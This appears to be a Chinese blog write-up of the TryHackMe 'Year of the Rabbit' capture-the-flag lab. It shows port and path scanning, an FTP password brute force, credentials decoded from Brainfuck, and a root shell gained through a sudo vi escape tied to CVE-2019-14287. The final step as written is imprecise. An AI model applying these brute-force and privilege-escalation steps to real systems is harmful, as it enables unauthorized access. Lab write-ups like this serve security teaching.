---
title: 【CTF】Tryhackme兔年靶场
url: https://mp.weixin.qq.com/s/ytqtZ1EwXsnFYmdsnqERlQ
source: Doonsec's feed
date: 2026-01-06
fetch_date: 2026-01-07T03:27:25.679734
---

# 【CTF】Tryhackme兔年靶场

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBL4y6PmkcekOI68RyicIvtYPNzI8to2F5jKEiasBKC0FNvoo9WorudByyQ/0?wx_fmt=jpeg)

# 【CTF】Tryhackme兔年靶场

asuna

皇后红队

![]()

在小说阅读器中沉浸阅读

这个比较偏向CTF，可能没有上一篇打域靶场精彩，以后就减少这种类型的了。

依然先做端口和路径收集

```
asuna@macbook web % sudo nmap --min-rate 10000 -Pn -p- 10.82.133.108Password:Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 19:54 +0800Nmap scan report for 10.82.133.108Host is up (0.29s latency).Not shown: 65532 closed tcp ports (reset)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  http
sudo nmap -T4 -n -sC -sV -Pn -p 21,22,80 10.82.133.108PORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.222/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)| ssh-hostkey: |   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)80/tcp open  http    Apache httpd 2.4.10 ((Debian))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 290ms].htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2781ms]assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 290ms]server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 291ms]:: Progress: [20481/20481] :: Job [1/1] :: 138 req/sec :: Duration: [0:02:40] :: Errors: 0 ::
```

http://10.82.133.108/assets/ 下有两个文件，一个 mp4 和一个 css

其中 css 文件里面有一个 php【但是我实战中不可能去翻 css 文件啊😧】

```
 }  /* Nice to see someone checking the stylesheets.     Take a look at the page: /sup3r_s3cr3t_fl4g.php  */
```

![](https://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBLyhOzibVy5s2xwic0HeiaaxeXTe7EvSrLzGMut4YjwfDtcPGHk4rlEwcPg/640?wx_fmt=png&from=appmsg)

？

重新访问看看

![](https://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBLiaFWubnHzNPFRPvRUROsllE3FExVspwPYMkjgB5iaIuZV43pTjjxv1Bw/640?wx_fmt=png&from=appmsg)

Word of advice... Turn off your javascript...

让我们关闭 JavaScript

（其实到这里我就已经怀疑这个方向是不是不对啊...）

```
Love it when people block Javascript...This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!Make sure your audio is turned up!
```

有一段视频，但是我加载不出来，看了 wp 是说在 56 秒钟有一段打打嗝视频提示你要使用：burpsuite

我的 yakit 发现并标红（规则）一处地址

![](https://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBLjuyAmcSL3LE6TL6iaq8lY5c0AWaJXcib5XSlazj1ia4NBxibUrh9sWhdicw/640?wx_fmt=png&from=appmsg)

访问是一张隐藏图片，但是我图片下载不下来，只能通过 wp 知道用 binwalk 工具能发现里面藏有一个 frp 的用户:"ftpuser" 且带有密码字典

```
kY1oxscv4EB2dk32?3^x1ex7#oep4IPQ_=ku@V8tQxFJ909rd1y25L6kpPR5E2Msn65NX66Wv~oFP2LRAQ@zcBphn!1V4bt3*58Z32Xeki^t!+uqB?DyI5iez1wGXKfPKQnJ90XzX&AnF5v7EiMd5!r%=18cwYyx6Eq-T^9#@yT2o$2exo~UdWZuI-8!JyI6iRSPTKM6RsLWZ1&^3O$oC~%XUlRO@KW3fjzWpUGHSWnTzl5f=9eS&*WWS9x0ZF=x1%8zSr4*E4NT5fOhShLR3xQV*gHYuC4P3QgF5kflszSNIZ2D%d58*v@R0rJ7p%6Axm05K94rU30Zx45z5cVi^Qf+u%0*q_S1Fvdp&bNl3#&lzLH%Ot0Bw&c%9
```

```
asuna@macbook zpscan % ./zpscan_darwin crack -i 10.82.133.108:21 --user ftpuser --pass-file /Users/asuna/security/dict/text.txt                   [INF] 存活探测1 / 1 [----------------------------------------------------------------------------------------------------------------------------] 100.00% 17 p/s[INF] 存活数量: 1[INF] 开始爆破: 10.82.133.108:21 ftp5 / 29 [--------------------->_______________________________________________________________________________________________________] 17.24% 1 p/sftp -> 10.82.133.108:21 ftpuser:5iez1wGXKfPKQ29 / 29 [---------------------------------------------------------------------------------------------------------------------------] 100.00% 2 p/s[INF] 爆破结束[INF] 爆破成功: 1ftp -> 10.82.133.108:21 ftpuser:5iez1wGXKfPKQ[INF] 运行时间: 13.620151708sasuna@macbook zpscan %
```

连接 ftp 打开是这么个东西

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->---<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->-----<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >+++++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

丢给 ai 说这个是**Brainfuck** 的极简编程语言

搜索在线运行得到

```
User: eli
Password: DSpDiM1wAEwid
```

ssh 连上去有这么一条信息：

```
1 new messageMessage from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```

我们进入上级目录看到有Gwendoline 账户有个 user.txt 但是属于Gwendoline 才能查看

```
eli@year-of-the-rabbit:/home/gwendoline$ ls -ltotal 4-r--r----- 1 gwendoline gwendoline 46 Jan 23  2020 user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBLGOKSbhib0xxySvHndXjSarOw2eMQauWswzwibxZ8kGUKnKaH9uISu0TQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBLDMSDFGyB8zTFuqU66oqmSCDpSXcQ08VHB3zh3YpyQoEIiag2FDkBkBg/640?wx_fmt=png&from=appmsg)

```
从根目录开始，递归找出所有文件名含 s3cr3t 的文件或目录find / -name "*s3cr3t*" 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php/usr/games/s3cr3t
```

进入这个目录

```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ lseli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -alltotal 12drwxr-xr-x 2 root root 4096 Jan 23  2020 .drwxr-xr-x 3 root root 4096 Jan 23  2020 ..-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!Your password is awful, Gwendoline. It should be at least 60 characters long! Not just MniVCQVhQHUNIHonestly!
Yours sincerely   -Root
```

拿到 gwendoline 的密码：MniVCQVhQHUNI

登录回去看到第一个 flag

那么现在就应该考虑提权了

sudo -l 发现可用信息

```
Matching Defaults entries for gwendoline on year-of-the-rabbit:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User gwendoline may run the following commands on year-of-the-rabbit:    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txtgwendoline@year-of-the-rabbit:~$
```

`(ALL, !root)`

读法：
“允许以 任意用户身份 执行命令，唯独不允许以 root 身份 执行。”

这就涉及到：CVE-2019-14287

```
sudo /usr/bin/vi /home/gwendoline/user.txt
```

进入 vi 编辑界面后直接按!sh 回车得到 root

![](https://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiaceEysqibXFWarMYdcHBHcMBLD6Ly1pn4ibU5Fibic9CichoqYVC52PNbiaU1ultuia11TN8Lq2A5Mia4toVdQ/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiacdbAgJ9OnxzF4bakgejLhuA2Iz8Rn84qiarFKFENkicqRpDvffJcCiavKLhRt7pFnKJTF3vUGB7fMPdw/0?wx_fmt=png)

皇后红队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7fo7xIFsiacdbAgJ9OnxzF4bakgejLhuA2Iz8Rn84qiarFKFENkicqRpDvffJcCiavKLhRt7pFnKJTF3vUGB7fMPdw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过